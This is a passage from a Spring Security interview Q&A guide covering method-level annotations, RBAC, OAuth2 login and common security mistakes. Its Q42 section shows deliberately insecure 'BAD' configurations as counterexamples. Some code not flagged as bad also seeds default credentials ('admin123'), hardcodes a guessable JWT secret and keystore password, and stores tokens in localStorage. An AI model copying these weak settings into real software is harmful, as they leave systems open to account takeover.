    
    public void deleteByToken(String token) {
        refreshTokenRepository.findByToken(token)
            .ifPresent(refreshTokenRepository::delete);
    }
}
```

**Client side :**
```javascript
let accessToken = 'eyJhbGc...'; // Access token (15min)
let refreshToken = 'uuid-refresh-token'; // Refresh token (7 days)

async function makeRequest(url) {
    let response = await fetch(url, {
        headers: { 'Authorization': `Bearer ${accessToken}` }
    });
    
    // If token expired
    if (response.status === 401) {
        // Refresh the access token
        const refreshResponse = await fetch('/auth/refresh', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ refreshToken })
        });
        
        if (refreshResponse.ok) {
            const data = await refreshResponse.json();
            accessToken = data.accessToken; // New access token
            
            // Retry the original request
            response = await fetch(url, {
                headers: { 'Authorization': `Bearer ${accessToken}` }
            });
        } else {
            // Refresh token also expired → Redirect to login
            window.location.href = '/login';
        }
    }
    
    return response;
}
```

---

### **Questions on Method-Level Security**

**Q33 : What is the difference between @EnableWebSecurity and @EnableMethodSecurity ?**

**A :** 

**@EnableWebSecurity :**
- Enables Spring Security at the **global** level
- Configures the **SecurityFilterChain**
- Protects **URLs** (request matchers)

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) {
        http.authorizeHttpRequests(auth -> auth
            .requestMatchers("/admin/**").hasRole("ADMIN")
            .anyRequest().authenticated()
        );
        return http.build();
    }
}
```

**@EnableMethodSecurity (Spring Boot 3+) :**
- Enables security at the **method** level
- Allows using `@PreAuthorize`, `@PostAuthorize`, `@Secured`, `@RolesAllowed`
- **Fine-grained** protection on individual methods

```java
@Configuration
@EnableMethodSecurity(
    prePostEnabled = true,    // @PreAuthorize, @PostAuthorize
    securedEnabled = true,    // @Secured
    jsr250Enabled = true      // @RolesAllowed
)
public class SecurityConfig { }
```

**Both are complementary :**
- `@EnableWebSecurity` → HTTP-level protection
- `@EnableMethodSecurity` → Business logic-level protection

---

**Q34 : When to use @PreAuthorize vs @Secured vs @RolesAllowed ?**

**A :** 

**@PreAuthorize (recommended) :**
- ✅ Support for **SpEL expressions** (very powerful)
- ✅ Complex logic possible
- ✅ Spring standard

```java
@PreAuthorize("hasRole('ADMIN')")
public void deleteUser(Long id) { }

@PreAuthorize("hasRole('ADMIN') or #id == authentication.principal.id")
public void updateUser(Long id, User user) { }

@PreAuthorize("@userSecurity.canAccessUser(#id)")
public User getUser(Long id) { }

@PreAuthorize("hasAnyRole('ADMIN', 'MODERATOR')")
public void moderateContent() { }
```

**@Secured :**
- ❌ No SpEL
- ✅ Simple and direct
- ⚠️ Requires `ROLE_` prefix

```java
@Secured("ROLE_ADMIN") // ROLE_ required
public void deleteUser(Long id) { }

@Secured({"ROLE_ADMIN", "ROLE_MODERATOR"}) // OR logic
public void moderateContent() { }
```

**@RolesAllowed (Java EE standard) :**
- ❌ No SpEL
- ✅ Java EE portability
- ✅ No `ROLE_` prefix

```java
@RolesAllowed("ADMIN") // No ROLE_
public void deleteUser(Long id) { }

@RolesAllowed({"ADMIN", "MODERATOR"})
public void moderateContent() { }
```

**My recommendation : @PreAuthorize** for maximum flexibility.

---

**Q35 : Give examples of complex SpEL expressions with @PreAuthorize**

**A :** 

```java
@RestController
@RequestMapping("/api/users")
public class UserController {
    
    // 1. Check a specific role
    @DeleteMapping("/{id}")
    @PreAuthorize("hasRole('ADMIN')")
    public void deleteUser(@PathVariable Long id) { }
    
    // 2. Multiple roles (OR)
    @GetMapping
    @PreAuthorize("hasAnyRole('ADMIN', 'MODERATOR', 'USER')")
    public List<User> getUsers() { }
    
    // 3. Multiple roles (AND)
    @PostMapping("/privileged")
    @PreAuthorize("hasRole('ADMIN') and hasRole('SUPER_USER')")
    public void privilegedAction() { }
    
    // 4. User can access their own data OR be admin
    @PutMapping("/{id}")
    @PreAuthorize("hasRole('ADMIN') or #id == authentication.principal.id")
    public User updateUser(@PathVariable Long id, @RequestBody User user) { }
    
    // 5. Check a specific permission
    @DeleteMapping("/{id}/posts/{postId}")
    @PreAuthorize("hasAuthority('DELETE_POST')")
    public void deletePost(@PathVariable Long id, @PathVariable Long postId) { }
    
    // 6. Custom security expression (Bean method)
    @GetMapping("/{id}")
    @PreAuthorize("@userSecurity.canAccessUser(#id)")
    public User getUser(@PathVariable Long id) {
        return userService.findById(id);
    }
    
    // 7. Check resource ownership
    @PutMapping("/posts/{postId}")
    @PreAuthorize("@postSecurity.isOwner(#postId, authentication.principal.username)")
    public Post updatePost(@PathVariable Long postId, @RequestBody Post post) {
        return postService.update(postId, post);
    }
    
    // 8. Complex combination
    @PostMapping("/sensitive-action")
    @PreAuthorize("hasRole('ADMIN') and hasIpAddress('192.168.1.0/24')")
    public void sensitiveAction() { }
    
    // 9. Check if user is authenticated
    @GetMapping("/profile")
    @PreAuthorize("isAuthenticated()")
    public User getProfile() { }
    
    // 10. Anonymous only (e.g. login page)
    @GetMapping("/public/welcome")
    @PreAuthorize("isAnonymous()")
    public String welcome() { }
    
    // 11. Check property of an object in the body
    @PutMapping("/accounts/{id}")
    @PreAuthorize("#account.owner == authentication.principal.username")
    public Account updateAccount(@PathVariable Long id, @RequestBody Account account) {
        return accountService.update(account);
    }
}

// Custom Security Beans
@Component("userSecurity")
public class UserSecurity {
    
    public boolean canAccessUser(Long userId) {
        Authentication auth = SecurityContextHolder.getContext().getAuthentication();
        
        // Admin can access everything
        if (auth.getAuthorities().stream()
                .anyMatch(a -> a.getAuthority().equals("ROLE_ADMIN"))) {
            return true;
        }
        
        // User can access their own data
        String currentUsername = auth.getName();
        User currentUser = userService.findByUsername(currentUsername);
        
        return currentUser.getId().equals(userId);
    }
}

@Component("postSecurity")
public class PostSecurity {
    
    @Autowired
    private PostRepository postRepository;
    
    public boolean isOwner(Long postId, String username) {
        return postRepository.findById(postId)
            .map(post -> post.getAuthor().getUsername().equals(username))
            .orElse(false);
    }
    
    public boolean canEdit(Long postId, String username) {
        // Admin or owner can edit
        Authentication auth = SecurityContextHolder.getContext().getAuthentication();
        
        boolean isAdmin = auth.getAuthorities().stream()
            .anyMatch(a -> a.getAuthority().equals("ROLE_ADMIN"));
        
        return isAdmin || isOwner(postId, username);
    }
}
```

**Available SpEL expressions :**
- `hasRole('ROLE')` : Check a role
- `hasAnyRole('ROLE1', 'ROLE2')` : OR on multiple roles
- `hasAuthority('PERMISSION')` : Check a permission
- `hasAnyAuthority('PERM1', 'PERM2')` : OR on permissions
- `isAuthenticated()` : User is authenticated
- `isAnonymous()` : User is not authenticated
- `principal` : The principal object (UserDetails)
- `authentication` : The complete Authentication object
- `#paramName` : Access to method parameters
- `@beanName.method()` : Call a Spring bean method

---

**Q36 : What is the difference between @PreAuthorize and @PostAuthorize ?**

**A :** 

**@PreAuthorize :**
- Evaluated **BEFORE** method execution
- If condition is false → Exception thrown, method not executed
- Typical usage : Check permissions before action

```java
@PreAuthorize("hasRole('ADMIN')")
public void deleteUser(Long id) {
    // This method only executes if user has ADMIN role
    userRepository.deleteById(id);
}
```

**@PostAuthorize :**
- Evaluated **AFTER** method execution
- Can access **returnObject** (method result)
- If condition is false → Exception, result not returned
- Typical usage : Filter data based on ownership

```java
@PostAuthorize("returnObject.owner == authentication.principal.username")
public Document getDocument(Long id) {
    // Method always executes
    Document doc = documentRepository.findById(id).orElseThrow();
    
    // After execution, checks if user is owner
    // If not → AccessDeniedException
    return doc;
}

// Practical example
@PostAuthorize("returnObject.author.username == authentication.principal.username or hasRole('ADMIN')")
public Post getPost(Long postId) {
    return postRepository.findById(postId).orElseThrow();
}
```

**Comparison :**
```java
// PRE: Checks BEFORE (efficient, avoids DB call if unauthorized)
@PreAuthorize("hasRole('ADMIN')")
public User getUserAdmin(Long id) {
    return userRepository.findById(id); // Only executes if ADMIN
}

// POST: Checks AFTER (needed if condition depends on result)
@PostAuthorize("returnObject.isPublic or returnObject.owner == authentication.name")
public Article getArticle(Long id) {
    return articleRepository.findById(id); // Always executes
    // Then checks if article is public OR user is owner
}
```

**Rule :** Use `@PreAuthorize` as much as possible (more efficient). Use `@PostAuthorize` only if the condition depends on the result.

---

**Q37 : How to implement a fine-grained permissions system (RBAC) ?**

**A :** 

**RBAC (Role-Based Access Control)** with granular permissions :

**Data model :**
```java
@Entity
@Data
public class User {
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;
    
    private String username;
    private String password;
    
    @ManyToMany(fetch = FetchType.EAGER)
    @JoinTable(
        name = "user_roles",
        joinColumns = @JoinColumn(name = "user_id"),
        inverseJoinColumns = @JoinColumn(name = "role_id")
    )
    private Set<Role> roles = new HashSet<>();
}

@Entity
@Data
public class Role {
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;
    
    private String name; // ADMIN, USER, MODERATOR
    
    @ManyToMany(fetch = FetchType.EAGER)
    @JoinTable(
        name = "role_permissions",
        joinColumns = @JoinColumn(name = "role_id"),
        inverseJoinColumns = @JoinColumn(name = "permission_id")
    )
    private Set<Permission> permissions = new HashSet<>();
}

@Entity
@Data
public class Permission {
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;
    
    private String name; // USER_READ, USER_WRITE, USER_DELETE, POST_CREATE, etc.
}
```

**Custom UserDetailsService :**
```java
@Service
public class CustomUserDetailsService implements UserDetailsService {
    
    @Autowired
    private UserRepository userRepository;
    
    @Override
    public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {
        User user = userRepository.findByUsernameWithRolesAndPermissions(username)
            .orElseThrow(() -> new UsernameNotFoundException("User not found"));
        
        // Collect all permissions from all roles
        Set<GrantedAuthority> authorities = new HashSet<>();
        
        // Add roles
        for (Role role : user.getRoles()) {
            authorities.add(new SimpleGrantedAuthority("ROLE_" + role.getName()));
            
            // Add role permissions
            for (Permission permission : role.getPermissions()) {
                authorities.add(new SimpleGrantedAuthority(permission.getName()));
            }
        }
        
        return new org.springframework.security.core.userdetails.User(
            user.getUsername(),
            user.getPassword(),
            authorities
        );
    }
}
```

**Usage with @PreAuthorize :**
```java
@RestController
@RequestMapping("/api/users")
public class UserController {
    
    // Check specific permission
    @GetMapping
    @PreAuthorize("hasAuthority('USER_READ')")
    public List<User> getUsers() {
        return userService.findAll();
    }
    
    @PostMapping
    @PreAuthorize("hasAuthority('USER_CREATE')")
    public User createUser(@RequestBody User user) {
        return userService.save(user);
    }
    
    @PutMapping("/{id}")
    @PreAuthorize("hasAuthority('USER_UPDATE')")
    public User updateUser(@PathVariable Long id, @RequestBody User user) {
        return userService.update(id, user);
    }
    
    @DeleteMapping("/{id}")
    @PreAuthorize("hasAuthority('USER_DELETE')")
    public void deleteUser(@PathVariable Long id) {
        userService.delete(id);
    }
    
    // Combination of permissions
    @PostMapping("/{id}/promote")
    @PreAuthorize("hasAuthority('USER_UPDATE') and hasAuthority('ROLE_MANAGE')")
    public User promoteUser(@PathVariable Long id) {
        return userService.promoteToAdmin(id);
    }
    
    // Permission OR role
    @GetMapping("/{id}")
    @PreAuthorize("hasAuthority('USER_READ') or hasRole('ADMIN')")
    public User getUser(@PathVariable Long id) {
        return userService.findById(id);
    }
}
```

**Roles and permissions initialization (DataLoader) :**
```java
@Component
public class DataLoader implements ApplicationRunner {
    
    @Autowired
    private RoleRepository roleRepository;
    
    @Autowired
    private PermissionRepository permissionRepository;
    
    @Autowired
    private UserRepository userRepository;
    
    @Autowired
    private PasswordEncoder passwordEncoder;
    
    @Override
    public void run(ApplicationArguments args) {
        if (roleRepository.count() == 0) {
            // Create permissions
            Permission userRead = permissionRepository.save(new Permission("USER_READ"));
            Permission userCreate = permissionRepository.save(new Permission("USER_CREATE"));
            Permission userUpdate = permissionRepository.save(new Permission("USER_UPDATE"));
            Permission userDelete = permissionRepository.save(new Permission("USER_DELETE"));
            
            Permission postRead = permissionRepository.save(new Permission("POST_READ"));
            Permission postCreate = permissionRepository.save(new Permission("POST_CREATE"));
            Permission postUpdate = permissionRepository.save(new Permission("POST_UPDATE"));
            Permission postDelete = permissionRepository.save(new Permission("POST_DELETE"));
            
            // Create USER role (limited permissions)
            Role userRole = new Role();
            userRole.setName("USER");
            userRole.setPermissions(Set.of(userRead, postRead, postCreate));
            roleRepository.save(userRole);
            
            // Create MODERATOR role
            Role moderatorRole = new Role();
            moderatorRole.setName("MODERATOR");
            moderatorRole.setPermissions(Set.of(
                userRead, postRead, postCreate, postUpdate, postDelete
            ));
            roleRepository.save(moderatorRole);
            
            // Create ADMIN role (all permissions)
            Role adminRole = new Role();
            adminRole.setName("ADMIN");
            adminRole.setPermissions(Set.of(
                userRead, userCreate, userUpdate, userDelete,
                postRead, postCreate, postUpdate, postDelete
            ));
            roleRepository.save(adminRole);
            
            // Create admin user
            User admin = new User();
            admin.setUsername("admin");
            admin.setPassword(passwordEncoder.encode("admin123"));
            admin.setRoles(Set.of(adminRole));
            userRepository.save(admin);
            
            // Create normal user
            User normalUser = new User();
            normalUser.setUsername("john");
            normalUser.setPassword(passwordEncoder.encode("password123"));
            normalUser.setRoles(Set.of(userRole));
            userRepository.save(normalUser);
        }
    }
}
```

**RBAC with permissions advantages :**
- ✅ Very fine-grained control (permission per action)
- ✅ Flexibility (change permissions without touching code)
- ✅ Scalable (easily add new permissions)
- ✅ Possible audit trail

---

### **Questions on OAuth2**

**Q38 : What is OAuth2 and what is it used for ?**

**A :** 

**OAuth2** is an **authorization protocol** (not authentication) that allows an application to access a user's resources on another service without exposing their credentials.

**Main use cases :**
1. **"Login with Google/Facebook/GitHub"** (Social Login)
2. **Access delegation** : Allow a third-party app to access your data (e.g. mobile app accesses your Google Drive)

**Concrete example :**
```
You want to use a photo management app that accesses your Google Photos
→ OAuth2 allows the app to access your photos WITHOUT knowing your Google password
```

**Roles in OAuth2 :**
- **Resource Owner** : The user (you)
- **Client** : The application (the photo management app)
- **Authorization Server** : Server that authenticates the user (Google)
- **Resource Server** : Server that hosts the protected resources (Google Photos API)

---

**Q39 : Explain the OAuth2 Authorization Code flow**

**A :** 

**Authorization Code Flow** is the most secure flow for web applications.

**Detailed steps :**

```
1. User clicks "Login with Google" on myapp.com

2. myapp.com → Redirect to Google Authorization Server
   https://accounts.google.com/o/oauth2/v2/auth?
     client_id=YOUR_CLIENT_ID
     &redirect_uri=https://myapp.com/callback
     &response_type=code
     &scope=profile email

3. User → Login on Google + Accept permissions (scope)

4. Google → Redirect to myapp.com/callback?code=AUTHORIZATION_CODE

5. myapp.com (backend) → Exchange code for tokens
   POST https://oauth2.googleapis.com/token
   Body:
     code=AUTHORIZATION_CODE
     client_id=YOUR_CLIENT_ID
     client_secret=YOUR_CLIENT_SECRET
     redirect_uri=https://myapp.com/callback
     grant_type=authorization_code

6. Google → Response with tokens
   {
     "access_token": "ya29.a0AfH6...",
     "expires_in": 3600,
     "token_type": "Bearer",
     "scope": "profile email",
     "refresh_token": "1//0gH..." (optional)
   }

7. myapp.com → Use access_token to fetch user info
   GET https://www.googleapis.com/oauth2/v2/userinfo
   Header: Authorization: Bearer ya29.a0AfH6...

8. Google → Response user info
   {
     "id": "123456789",
     "email": "john@gmail.com",
     "name": "John Doe",
     "picture": "https://..."
   }

9. myapp.com → Create local session/JWT for user
```

**Why Authorization Code instead of direct Access Token ?**
- ✅ **Client Secret** never exposed to the browser
- ✅ **Authorization Code** exchanged server-side (secure)
- ✅ Protection against interception

---

**Q40 : How to implement "Login with Google" in Spring Boot ?**

**A :** 

**1. Create OAuth2 Client on Google Cloud Console :**
```
1. https://console.cloud.google.com/
2. Create Project → "MyApp"
3. APIs & Services → Credentials
4. Create OAuth 2.0 Client ID
   - Application type: Web application
   - Authorized redirect URIs: http://localhost:8080/login/oauth2/code/google
5. Copy Client ID and Client Secret
```

**2. Dependencies :**
```xml
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-oauth2-client</artifactId>
</dependency>
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-thymeleaf</artifactId>
</dependency>
```

**3. application.properties :**
```properties
# Google OAuth2
spring.security.oauth2.client.registration.google.client-id=YOUR_CLIENT_ID.apps.googleusercontent.com
spring.security.oauth2.client.registration.google.client-secret=YOUR_CLIENT_SECRET
spring.security.oauth2.client.registration.google.scope=profile,email
spring.security.oauth2.client.registration.google.redirect-uri={baseUrl}/login/oauth2/code/{registrationId}

# GitHub OAuth2 (optional)
spring.security.oauth2.client.registration.github.client-id=YOUR_GITHUB_CLIENT_ID
spring.security.oauth2.client.registration.github.client-secret=YOUR_GITHUB_SECRET
spring.security.oauth2.client.registration.github.scope=read:user,user:email
```

**4. Security Configuration :**
```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/", "/login", "/error", "/webjars/**").permitAll()
                .anyRequest().authenticated()
            )
            .oauth2Login(oauth2 -> oauth2
                .loginPage("/login")
                .defaultSuccessUrl("/dashboard", true)
                .failureUrl("/login?error=true")
                .userInfoEndpoint(userInfo -> userInfo
                    .userService(customOAuth2UserService)
                )
            )
            .logout(logout -> logout
                .logoutSuccessUrl("/")
                .permitAll()
            );
        
        return http.build();
    }
}
```

**5. Custom OAuth2UserService (save user to DB) :**
```java
@Service
public class CustomOAuth2UserService extends DefaultOAuth2UserService {
    
    @Autowired
    private UserRepository userRepository;
    
    @Override
    public OAuth2User loadUser(OAuth2UserRequest userRequest) throws OAuth2AuthenticationException {
        OAuth2User oAuth2User = super.loadUser(userRequest);
        
        String provider = userRequest.getClientRegistration().getRegistrationId(); // google, github
        String providerId = oAuth2User.getAttribute("sub"); // Google ID
        String email = oAuth2User.getAttribute("email");
        String name = oAuth2User.getAttribute("name");
        String picture = oAuth2User.getAttribute("picture");
        
        // Find or create user
        User user = userRepository.findByEmail(email)
            .orElseGet(() -> {
                User newUser = new User();
                newUser.setEmail(email);
                newUser.setName(name);
                newUser.setProvider(provider);
                newUser.setProviderId(providerId);
                newUser.setPicture(picture);
                newUser.setRoles(Set.of("USER"));
                return userRepository.save(newUser);
            });
        
        // Update info if needed
        if (!user.getName().equals(name) || !user.getPicture().equals(picture)) {
            user.setName(name);
            user.setPicture(picture);
            userRepository.save(user);
        }
        
        return oAuth2User;
    }
}
```

**6. User Entity (OAuth2) :**
```java
@Entity
@Table(name = "users")
@Data
public class User {
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;
    
    private String email;
    private String name;
    private String picture;
    
    // OAuth2 fields
    private String provider; // google, github, facebook
    private String providerId; // ID from provider
    
    @ElementCollection(fetch = FetchType.EAGER)
    private Set<String> roles = new HashSet<>();
    
    // No password for OAuth2 users
}
```

**7. Controllers :**
```java
@Controller
public class HomeController {
    
    @GetMapping("/")
    public String home() {
        return "home";
    }
    
    @GetMapping("/login")
    public String login() {
        return "login";
    }
    
    @GetMapping("/dashboard")
    public String dashboard(Model model, @AuthenticationPrincipal OAuth2User principal) {
        if (principal != null) {
            model.addAttribute("name", principal.getAttribute("name"));
            model.addAttribute("email", principal.getAttribute("email"));
            model.addAttribute("picture", principal.getAttribute("picture"));
        }
        return "dashboard";
    }
}
```

**8. Login Page (Thymeleaf) :**
```html
<!DOCTYPE html>
<html xmlns:th="http://www.thymeleaf.org">
<head>
    <title>Login</title>
</head>
<body>
    <h1>Login to MyApp</h1>
    
    <div>
        <a href="/oauth2/authorization/google">
            <button>
                <img src="/images/google-icon.png" alt="Google">
                Login with Google
            </button>
        </a>
    </div>
    
    <div>
        <a href="/oauth2/authorization/github">
            <button>
                <img src="/images/github-icon.png" alt="GitHub">
                Login with GitHub
            </button>
        </a>
    </div>
    
    <div th:if="${param.error}">
        <p style="color: red;">Login failed. Please try again.</p>
    </div>
</body>
</html>
```

**9. Dashboard Page :**
```html
<!DOCTYPE html>
<html xmlns:th="http://www.thymeleaf.org">
<head>
    <title>Dashboard</title>
</head>
<body>
    <h1>Welcome, <span th:text="${name}">User</span>!</h1>
    
    <div>
        <img th:src="${picture}" alt="Profile Picture" width="100">
        <p>Email: <span th:text="${email}">email@example.com</span></p>
    </div>
    
    <a href="/logout">
        <button>Logout</button>
    </a>
</body>
</html>
```

---

**Q41 : How to combine OAuth2 and JWT in the same application ?**

**A :** 

**Use case :** Login with Google (OAuth2) then use JWT for API requests.

**Flow :**
```
1. User → Login with Google (OAuth2)
2. App → Fetches user info from Google
3. App → Creates/updates user in DB
4. App → Generates JWT with user info
5. App → Returns JWT to client
6. Client → Uses JWT for all API requests
```

**Implementation :**

```java
@RestController
@RequestMapping("/auth")
public class OAuth2AuthController {
    
    @Autowired
    private JwtUtil jwtUtil;
    
    @Autowired
    private UserRepository userRepository;
    
    @GetMapping("/oauth2/success")
    public ResponseEntity<?> oauth2Success(@AuthenticationPrincipal OAuth2User principal) {
        
        // Extract info from OAuth2
        String email = principal.getAttribute("email");
        String name = principal.getAttribute("name");
        
        // Load or create user
        User user = userRepository.findByEmail(email)
            .orElseGet(() -> {
                User newUser = new User();
                newUser.setEmail(email);
                newUser.setName(name);
                newUser.setProvider("google");
                newUser.setRoles(Set.of("USER"));
                return userRepository.save(newUser);
            });
        
        // Generate JWT
        List<String> roles = new ArrayList<>(user.getRoles());
        String jwtToken = jwtUtil.generateToken(user.getEmail(), roles);
        
        // Return JWT
        return ResponseEntity.ok(new AuthResponse(
            jwtToken,
            user.getEmail(),
            user.getName(),
            roles
        ));
    }
}

// Security Config
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    http
        .csrf(csrf -> csrf.disable())
        .authorizeHttpRequests(auth -> auth
            .requestMatchers("/auth/**", "/oauth2/**", "/login/**").permitAll()
            .anyRequest().authenticated()
        )
        .oauth2Login(oauth2 -> oauth2
            .defaultSuccessUrl("/auth/oauth2/success", true)
        )
        .sessionManagement(session -> session
            .sessionCreationPolicy(SessionCreationPolicy.STATELESS)
        )
        .addFilterBefore(jwtAuthFilter, UsernamePasswordAuthenticationFilter.class);
    
    return http.build();
}
```

**Frontend (React) :**
```javascript
// Open OAuth2 popup
function loginWithGoogle() {
    const width = 500;
    const height = 600;
    const left = window.screen.width / 2 - width / 2;
    const top = window.screen.height / 2 - height / 2;
    
    const popup = window.open(
        'http://localhost:8080/oauth2/authorization/google',
        'Google Login',
        `width=${width},height=${height},left=${left},top=${top}`
    );
    
    // Listen for message from popup
    window.addEventListener('message', (event) => {
        if (event.origin === 'http://localhost:8080') {
            const { token } = event.data;
            localStorage.setItem('token', token);
            popup.close();
            window.location.href = '/dashboard';
        }
    });
}
```

---

**Q42 : What are common security issues with Spring Security and how to avoid them ?**

**A :** 

**1. Weak Password Encoding :**
```java
// ❌ BAD
@Bean
public PasswordEncoder passwordEncoder() {
    return NoOpPasswordEncoder.getInstance(); // Plain text !
}

// ✅ GOOD
@Bean
public PasswordEncoder passwordEncoder() {
    return new BCryptPasswordEncoder(12);
}
```

**2. CSRF Disabled without reason :**
```java
// ❌ BAD (for web app with session)
http.csrf(csrf -> csrf.disable());

// ✅ GOOD (disable only for stateless REST API)
http
    .csrf(csrf -> csrf.disable())
    .sessionManagement(session -> session
        .sessionCreationPolicy(SessionCreationPolicy.STATELESS)
    );
```

**3. Permissive CORS :**
```java
// ❌ BAD
configuration.setAllowedOrigins(Arrays.asList("*"));
configuration.setAllowCredentials(true); // Does not work with *

// ✅ GOOD
configuration.setAllowedOrigins(Arrays.asList(
    "http://localhost:3000",
    "https://myapp.com"
));
configuration.setAllowCredentials(true);
```

**4. Weak JWT Secret :**
```properties
# ❌ BAD
jwt.secret=secret

# ✅ GOOD (256+ bits)
jwt.secret=myVerySecureSecretKeyForJwtTokenGenerationWithAtLeast256BitsForHS256Algorithm
```

**5. JWT without expiration :**
```java
// ❌ BAD
return Jwts.builder()
    .setSubject(username)
    // No expiration !
    .signWith(key)
    .compact();

// ✅ GOOD
return Jwts.builder()
    .setSubject(username)
    .setExpiration(new Date(System.currentTimeMillis() + 900000)) // 15min
    .signWith(key)
    .compact();
```

**6. Exposing stack traces in production :**
```java
// ❌ BAD
@ExceptionHandler(Exception.class)
public ResponseEntity<?> handleException(Exception e) {
    return ResponseEntity.status(500).body(e.getMessage());
}

// ✅ GOOD
@ExceptionHandler(Exception.class)
public ResponseEntity<?> handleException(Exception e) {
    logger.error("Error occurred", e);
    return ResponseEntity.status(500)
        .body(new ErrorResponse("Internal server error"));
}
```

**7. No HTTPS in production :**
```properties
# ✅ Force HTTPS
server.ssl.enabled=true
server.ssl.key-store=classpath:keystore.p12
server.ssl.key-store-password=password
server.ssl.key-store-type=PKCS12
```

**8. Default credentials :**
```java
// ❌ BAD
UserDetails user = User.builder()
    .username("admin")
    .password("admin")
    .build();

// ✅ GOOD
UserDetails user = User.builder()
    .username(env.getProperty("ADMIN_USERNAME"))
    .password(passwordEncoder.encode(env.getProperty("ADMIN_PASSWORD")))
    .build();
```
